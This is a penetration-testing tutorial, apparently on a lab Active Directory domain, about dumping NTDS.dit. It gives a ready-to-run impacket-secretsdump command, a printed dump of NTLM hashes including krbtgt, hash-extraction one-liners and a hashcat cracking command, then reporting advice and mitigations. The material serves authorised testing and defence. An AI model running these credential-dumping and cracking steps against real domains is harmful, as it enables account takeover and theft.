# Dumping the NTDS.dit

## Overview

The NTDS.dit (NT Directory Services Database) is the primary database file used by Active Directory to store all domain data. This includes:

- **User information**: Account details, properties, and metadata.
- **Group information**: Security groups, distribution groups, and memberships.
- **Security descriptors**: Access control lists (ACLs) and permissions for objects.
- **Password hashes**: NTLM and Kerberos key hashes for all user accounts.

Once you have Domain Administrator access, dumping NTDS.dit provides access to every password hash in the domain. Combined with offline cracking, this can yield plaintext passwords for a significant portion of the domain, along with valuable insights for the penetration test report.

## Walkthrough

### 1. Dump NTDS.dit from the Domain Controller

The most straightforward method is using `secretdump.py` from the impacket toolkit. This tool extracts credentials directly from the DC without needing physical access to the NTDS.dit file.

```bash
# Using secretdump with domain admin credentials
impacket-secretsdump -just-dc-ntlm <domain>/<username>:<password>@<domain_controller_ip>
```

The hash format is: `USERNAME:RID:LM_HASH:NTLM_HASH:::`. For most modern systems, the LM hash (first hash) can be ignored; focus on the NTLM hash.

```bash
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@10.0.2.18 -just-dc-ntlm

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a2345375a47a92754e2505132aca194b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:50e5806d7c53f975dfbf0e6d57a3a9c1:::
vboxuser:1000:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
MARVEL.local\tstark:1105:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
MARVEL.local\SQLService:1106:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
MARVEL.local\fcastle:1107:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
MARVEL.local\pparker:1108:aad3b435b51404eeaad3b435b51404ee:07d128430a6338f8d537f6b3ae1dc136:::
hawkeye:1113:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
HYDRA-DC$:1001:aad3b435b51404eeaad3b435b51404ee:228f0d82575bba613346904dae3eaca8:::
THEPUNISHER$:1109:aad3b435b51404eeaad3b435b51404ee:1f1e600da217cce8d0e5cd190d61f42e:::
SPIDERMAN$:1110:aad3b435b51404eeaad3b435b51404ee:d0994ac2195e1e81d0f84a2e33f60cfa:::
HBO$:1112:aad3b435b51404eeaad3b435b51404ee:cb933184b9dc563103819a8c1f4df570:::
[*] Cleaning up...
```

### 2. Extract NTLM Hashes

If you've dumped the hashes in a format containing both LM and NTLM, extract just the NTLM hashes for cracking:

```bash
# Extract NTLM hashes from secretdump output
cat secretdump_output.txt | awk -F':' '{print $4}' > ntlm_hashes.txt

# Or using a simple script
grep -oP '(?<=:)[a-f0-9]{32}:[a-f0-9]{32}(?=:::)' secretdump_output.txt | cut -d: -f2 > ntlm_hashes.txt
```

### 3. Crack the NTLM Hashes

Use offline cracking tools to attempt to recover plaintext passwords. Popular options include:

```bash
hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt --show
```

### 4. Analyze and Report Results

Once you've cracked passwords, compile statistics for the client report:

- **Total hashes recovered**: Number of domain user accounts.
- **Cracked hashes**: Number of successfully cracked passwords.
- **Crack rate**: Percentage of hashes successfully cracked.
- **Most common passwords**: Identify organizational patterns and weak password choices.
- **Weak password policies**: Highlight accounts with short, simple, or reused passwords.

Use tools like Excel, Python (pandas), or dedicated reporting tools to create visualizations that demonstrate password weakness across the organization.

## Mitigations

- **Enforce Strong Password Policies**: Implement organization-wide password policies requiring minimum length (14+ characters), complexity, and periodic changes.
- **Implement Account Lockout Policies**: Prevent brute-force attacks by locking accounts after failed login attempts.
- **Use Multi-Factor Authentication (MFA)**: Reduce the impact of compromised passwords with MFA on sensitive accounts.
- **Monitor NTDS.dit Access**: Alert on unauthorized attempts to dump or access NTDS.dit on domain controllers.
- **Restrict Domain Admin Accounts**: Limit the number of DA accounts and monitor their usage closely.
- **Passwordless Authentication**: Migrate to passwordless methods (Windows Hello, FIDO2) where possible.
- **Regular Security Audits**: Conduct periodic penetration tests to identify weak passwords and enforce policy compliance.
- **Educate Users**: Implement security awareness training to promote better password hygiene and recognition of social engineering.
